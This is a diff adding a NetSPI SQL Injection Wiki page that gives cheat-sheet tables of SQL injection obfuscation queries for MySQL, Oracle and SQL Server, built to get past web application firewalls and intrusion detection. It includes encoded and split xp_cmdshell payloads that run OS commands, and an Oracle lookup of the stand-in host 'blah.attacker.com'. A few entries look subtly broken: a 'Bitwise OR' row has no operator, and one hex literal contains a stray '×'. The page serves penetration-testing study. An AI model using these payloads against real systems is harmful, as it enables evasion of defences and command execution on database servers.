@@ -1,0 +1,627 @@
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <title>Obfuscation | NetSPI SQL Injection Wiki</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="../../assets/scss/index.css%3F1571409135814090317.css" />
+  <link rel="stylesheet" href="../../assets/scss/nav.css%3F1571409135814090317.css" />
+  <link rel="stylesheet" href="../../assets/scss/tab.css%3F1571409135814090317.css" />
+  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
+  <script src="../../assets/javascripts/cash.min.js"></script>
+  <script type="text/javascript" async src="../../assets/javascripts/index.js%3F1571409135814090317"></script>
+  
+  <script type="text/javascript" async src="../../assets/javascripts/tab.js%3F1571409135814090317"></script>
+  
+  <meta name="theme-color" content="#ffffff">
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
+  <meta property="og:description" content="Obfuscating SQL Injection queries aids in bypassing Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS)." />
+  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
+  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
+  <meta name="twitter:description" content="Obfuscating SQL Injection queries aids in bypassing Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS)." />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
+  <meta name="twitter:site" content="@netspi" />
+  <meta name="twitter:creator" content="@netspi" />
+  <meta name="description" content="Obfuscating SQL Injection queries aids in bypassing Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS).">
+  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,waf, ids, ips, obfuscation, query, manipulation">
+  <link rel="author" href="https://netspi.com" />
+  <link rel="shortcut icon" href="../../assets/images/favicon.ico">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+</head>
+
+<body class="preload">
+  <div class="mobile"></div>
+  <div id="contentWrapper">
+    <div id="topBar">
+      <div class="n-nav-icon default">
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      <div id="logoContainer">
+      <a href="https://netspi.com"><img src="../../assets/images/logo.png%3F1571409135814090317" /></a><br/>
+      </div>
+    </div>
+    <div class="n-navbar default">
+      <ul>
+  
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/" href="../../index.html">
+      
+    <div>Home</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
+    
+    <div>About Us</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/detection" href="../../detection.html">
+      
+    <div>Injection Detection</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/dbmsIdentification/" href="../../dbmsIdentification/index.html">
+      
+    <div>DBMS Identification</div>
+    </a>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/" href="../../injectionTypes/index.html">
+          
+          <div>Injection Types</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/errorBased/" href="../../injectionTypes/errorBased/index.html">
+          
+          <div>Error Based Injection</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/unionBased/" href="../../injectionTypes/unionBased/index.html">
+          
+          <div>Union Based Injection</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/blindBased/" href="../../injectionTypes/blindBased/index.html">
+          
+          <div>Blind Based Injection</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/" href="../index.html">
+          
+          <div>Injection Techniques</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../conditionalStatements/index.html">
+          
+          <div>Conditional Statements</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../injectionPlacement/index.html">
+          
+          <div>Injection Placement</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/obfuscation/" href="index.html">
+          
+          <div>Injection Obfuscation</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/attackQueries/" href="../../attackQueries/index.html">
+          
+          <div>Attack Queries</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/informationGathering/" href="../../attackQueries/informationGathering/index.html">
+          
+          <div>Information Gathering</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/dataTargeting/" href="../../attackQueries/dataTargeting/index.html">
+          
+          <div>Data Targeting</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="../../attackQueries/privilegeEscalation/index.html">
+          
+          <div>Privilege Escalation</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/executingOSCommands/" href="../../attackQueries/executingOSCommands/index.html">
+          
+          <div>Executing OS Commands</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="../../attackQueries/readingAndWritingFiles/index.html">
+          
+          <div>Reading and Writing Files</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/lateralMovement/" href="../../attackQueries/lateralMovement/index.html">
+          
+          <div>Lateral Movement</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/dataExfiltration/" href="../../attackQueries/dataExfiltration.html">
+          
+          <div>Data Exfiltration</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/persistence/" href="../../attackQueries/persistence/index.html">
+          
+          <div>Persistence</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+          <div>Misc.</div>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/contributors" href="../../misc/contributors.html">
+          
+          <div>Contributors</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/references/" href="../../misc/references/index.html">
+          
+          <div>References</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/sandboxes/" href="../../misc/sandboxes/index.html">
+          
+          <div>Sandboxes</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/tools/" href="../../misc/tools/index.html">
+          
+          <div>Tools</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+</ul>
+
+    </div>
+    <div id="contentContainer">
+      <div id="tabs" class="tabs" data-tabs-ignore-url="false">
+
+<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
+<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="obfuscating-queries">Obfuscating Queries</h3>
+
+<p class="pageDescription">Obfuscating queries aids in bypassing Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS). Below are examples of basic query obfuscations, they may require modification before being applied to certain injections.</p>
+
+<table class="table table-striped table-hover">
+    <thead>
+        <tr>
+            <th>Description</th>
+            <th align="left">Query</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>ASCII &gt; Char</td>
+            <td>SELECT char(65)</td>
+        </tr>
+        <tr>
+            <td>Char &gt; ASCII</td>
+            <td>SELECT ascii('A')</td>
+        </tr>
+        <tr>
+            <td>Hex</td>
+            <td>SELECT 0x4A414B45</td>
+        </tr>
+        <tr>
+            <td>Hex &gt; Int</td>
+            <td>SELECT 0x20 + 0x40</td>
+        </tr>
+        <tr>
+            <td>Bitwise AND</td>
+            <td>SELECT 6 &amp; 2</td>
+        </tr>
+        <tr>
+            <td>Bitwise OR</td>
+            <td>SELECT 6</td>
+        </tr>
+        <tr>
+            <td>Bitwise Negation</td>
+            <td>SELECT ~6</td>
+        </tr>
+        <tr>
+            <td>Bitwise XOR</td>
+            <td>SELECT 6 ^ 2</td>
+        </tr>
+        <tr>
+            <td>Right Shift</td>
+            <td>SELECT 6&gt;&gt;2</td>
+        </tr>
+        <tr>
+            <td>Left Shift</td>
+            <td>SELECT 6&lt;&lt;2</td>
+        </tr>
+        <tr>
+            <td>Substring</td>
+            <td>SELECT substr('abcd', 3, 2)<br><em>substr(string, index, length)</em></td>
+        </tr>
+        <tr>
+            <td>Casting</td>
+            <td>SELECT cast('1' AS unsigned integer)<br>SELECT cast('123' AS char)</td>
+        </tr>
+        <tr>
+            <td>Concatenation</td>
+            <td>SELECT concat('net','spi')<br>SELECT 'n' 'et' 'spi'</td>
+        </tr>
+        <tr>
+            <td>No Quotes</td>
+            <td>SELECT CONCAT(CHAR(74),CHAR(65),CHAR(75),CHAR(69))</td>
+        </tr>
+        <tr>
+            <td>Block comment</td>
+            <td>SELECT/*block<br/>comment*/"test"</td>
+        </tr>
+        <tr>
+            <td>Single line comment</td>
+            <td>SELECT 1 -- comments out rest of line<br/>SELECT 1 # comments out rest of line</td>
+        </tr>
+        <tr>
+            <td>No Spaces</td>
+            <td>SELECT(username)FROM(USERS)WHERE(username='netspi')</td>
+        </tr>
+        <tr>
+            <td>Allowed Whitespaces</td>
+            <td>09, 0A, 0B, 0C, 0D, A0, 20</td>
+        </tr>
+        <tr>
+            <td>URL Encode</td>
+            <td>SELECT%20%2A%20FROM%20USERS</td>
+        </tr>
+        <tr>
+            <td>Double URL Encode</td>
+            <td>SELECT%2520%2A%2520FROM%2520USERS</td>
+        </tr>
+        <tr>
+            <td>Invalid Percent Encode</td>
+            <td>%SEL%ECT * F%R%OM U%S%ERS</td>
+        </tr>
+    </tbody>
+</table>
+
+
+<p><em>Further reading <a target="_blank" rel="noopener" href="https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf">here</a></em></p>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
+<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="obfuscating-queries">Obfuscating Queries</h3>
+
+<p class="pageDescription">Obfuscating queries aids in bypassing Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS). Below are examples of basic query obfuscations, they may require modification before being applied to certain injections.</p>
+
+<table class="table table-striped table-hover">
+    <thead>
+        <tr>
+            <th>Description</th>
+            <th>Query</th>
+        </tr>
+    </thead>
+    <tbody>
+          <tr>
+              <td>ASCII &gt; Char</td>
+              <td>SELECT char(65) from dual</td>
+          </tr>
+          <tr>
+              <td>Char &gt; ASCII</td>
+              <td>SELECT ascii('A') from dual</td>
+          </tr>
+          <tr>
+              <td>Bitwise AND</td>
+              <td>SELECT 6 &amp; 2 from dual</td>
+          </tr>
+          <tr>
+              <td>Bitwise OR</td>
+              <td>SELECT 6 from dual</td>
+          </tr>
+          <tr>
+              <td>Bitwise Negation</td>
+              <td>SELECT ~6 from dual</td>
+          </tr>
+          <tr>
+              <td>Bitwise XOR</td>
+              <td>SELECT 6 ^ 2 from dual</td>
+          </tr>
+          <tr>
+              <td>Select Nth Char</td>
+              <td>SELECT substr('abcd', 3, 1) FROM dual; -- Returns 3rd charcter, 'c'</td>
+          </tr>
+          <tr>
+              <td>Substring</td>
+              <td>SELECT substr('abcd', 3, 2) from dual<br><em>substr(string, index, length)</em></td>
+          </tr>
+          <tr>
+              <td>Casting</td>
+              <td>select CAST(12 AS CHAR(32)) from dual</td>
+          </tr>
+          <tr>
+              <td>Concatenation</td>
+              <td>SELECT concat('net','spi') from dual</td>
+          </tr>
+        <tr>
+            <td>Comments</td>
+            <td>SELECT 1 FROM dual -- comment</td>
+        </tr>
+        <tr>
+            <td>If Statement</td>
+            <td>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF;</td>
+        </tr>
+        <tr>
+            <td>Case Statement</td>
+            <td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; -- Returns 1<br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; -- Returns 2</td>
+        </tr>
+        <tr>
+            <td>Time Delay</td>
+            <td>BEGIN DBMS_LOCK.SLEEP(5); END; (Requires Privileges)<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;<br>SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual;<br>SELECT UTL_HTTP.REQUEST('http://google.com')
+                FROM dual;</td>
+        </tr>
+        <tr>
+            <td>Select Nth Row</td>
+            <td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; -- Returns 9th row</td>
+        </tr>
+        <tr>
+            <td>Bitwise AND</td>
+            <td>SELECT bitand(6,2) FROM dual; -- Returns 2<br>SELECT bitand(6,1) FROM dual; -- Returns 0</td>
+        </tr>
+        <tr>
+            <td>String Concatenation</td>
+            <td>SELECT 'A' || 'B' FROM dual; -- Returns AB</td>
+        </tr>
+        <tr>
+            <td>Avoiding Quotes</td>
+            <td>SELECT chr(65) || chr(66) FROM dual; -- Returns AB</td>
+        </tr>
+        <tr>
+            <td>Hex Encoding</td>
+            <td>SELECT 0x75736572 FROM dual;</td>
+        </tr>
+    </tbody>
+</table>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
+<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="obfuscating-queries">Obfuscating Queries</h3>
+
+<p class="pageDescription">Obfuscating queries aids in bypassing Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS). Below are examples of basic query obfuscations, they may require modification before being applied to certain injections.</p>
+
+<table class="table table-striped table-hover">
+    <thead>
+        <tr>
+            <th>Description</th>
+            <th>Query</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>ASCII &gt; Char</td>
+            <td>SELECT char(65)</td>
+        </tr>
+        <tr>
+            <td>Char &gt; ASCII</td>
+            <td>SELECT ascii('A')</td>
+        </tr>
+        <tr>
+            <td>Hex &gt; Int</td>
+            <td>SELECT 0x20 + 0x40</td>
+        </tr>
+        <tr>
+            <td>Bitwise AND</td>
+            <td>SELECT 6 &amp; 2</td>
+        </tr>
+        <tr>
+            <td>Bitwise OR</td>
+            <td>SELECT 6</td>
+        </tr>
+        <tr>
+            <td>Bitwise Negation</td>
+            <td>SELECT ~6</td>
+        </tr>
+        <tr>
+            <td>Bitwise XOR</td>
+            <td>SELECT 6 ^ 2</td>
+        </tr>
+        <tr>
+            <td>Substring</td>
+            <td>SELECT substring('abcd', 3, 2)<br><em>substring(string, index, length)</em></td>
+        </tr>
+        <tr>
+            <td>Casting</td>
+            <td>SELECT cast('1' AS unsigned integer)<br>SELECT cast('123' AS char)</td>
+        </tr>
+        <tr>
+            <td>Concatenation</td>
+            <td>SELECT concat('net','spi')</td>
+        </tr>
+        <tr>
+            <td>Comments</td>
+            <td>SELECT 1 --comment<br>SELECT/*comment*/1</td>
+        </tr>
+        <tr>
+            <td>Avoiding Quotes</td>
+            <td>SELECT char(65)+char(66) -- returns AB</td>
+        </tr>
+        <tr>
+            <td>Avoid semicolon with %0d</td>
+            <td>%0dwaitfor+delay+'0:0:10'--</td>
+        </tr>
+        <tr>
+            <td>Bypass Case Filtering</td>
+            <td>EXEC xP_cMdsheLL 'dir';</td>
+        </tr>
+        <tr>
+            <td>Avoid Spaces - With Comments</td>
+            <td>EXEC/**/xp_cmdshell/**/'dir';--<br>';ex/**/ec xp_cmds/**/hell 'dir';</td>
+        </tr>
+        <tr>
+            <td>Avoid Query Detection - with concatenation</td>
+            <td>DECLARE @cmd as varchar(3000);SET @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+'/**/'+""+'d'+'i'+'r'+"";exec(@cmd);</td>
+        </tr>
+        <tr>
+            <td>Avoid Query Detection - Char Encoding</td>
+            <td>DECLARE @cmd as varchar(3000);SET @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));EXEC(@cmd);</td>
+        </tr>
+        <tr>
+            <td>Avoid Query Detection - Base64 Encoding</td>
+            <td>DECLARE @data varchar(max), @XmlData xml;SET @data = 'ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn';SET @XmlData = CAST('' + @data + '' as xml);SET @data = CONVERT(varchar(max), @XmlData.value('(data)[1]', 'varbinary(max)'));exec (@data);</td>
+        </tr>
+        <tr>
+            <td>Avoid Query Detection - Nchar Encoding</td>
+            <td>DECLARE @cmd as nvarchar(3000);SET @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+nchar(101)+nchar(114)+nchar(46)+nchar(46)+nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)+nchar(100)+nchar(115)+nchar(104)+nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)+nchar(105)+nchar(114)+nchar(39)+nchar(59));EXEC(@cmd);</td>
+        </tr>
+        <tr>
+            <td>Avoid Query Detection - Binary Encoded ASCII + CAST</td>
+            <td>DECLARE @cmd as varchar(MAX);SET @cmd = cast(0x78705F636D647368656C6C202764697227 as varchar(MAX));exec(@cmd);</td>
+        </tr>
+        <tr>
+            <td>Avoid Query Detection - Binary Encoded ASCII + CONVERT</td>
+            <td>DECLARE @cmd as varchar(MAX);SET @cmd = convert(varchar(MAX),0x78705F636D647368656C6C202764697227);exec(@cmd);</td>
+        </tr>
+        <tr>
+            <td>Avoid Query Detection - varbinary(MAX)</td>
+            <td>DECLARE @cmd as varchar(MAX);SET @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);exec(@cmd);</td>
+        </tr>
+        <tr>
+            <td>Avoid EXEC() - sp_sqlexec</td>
+            <td>DECLARE @cmd as varchar(3000);SET @cmd = convert(varchar(0),0×78705F636D647368656C6C202764697227);exec sp_sqlexec @cmd;</td>
+        </tr>
+        <tr>
+            <td>Execute xp_cmdshell 'dir'</td>
+            <td>DECLARE @tmp as varchar(MAX);<br>SET @tmp = char(88)+char(80)+char(95)+char(67)+char(77)+<br>char(68)+char(83)+char(72)+char(69)+char(76)+char(76);<br>exec @tmp 'dir';</td>
+        </tr>
+    </tbody>
+</table>
+
+</div>
+
+</div>
+
+      <div><div>
+  <br/>
+  <p>© 2019 Copyright by NetSPI. All rights reserved.</p>
+</div>
+</div>
+    </div>
+  </div>
+</body>
+</html>
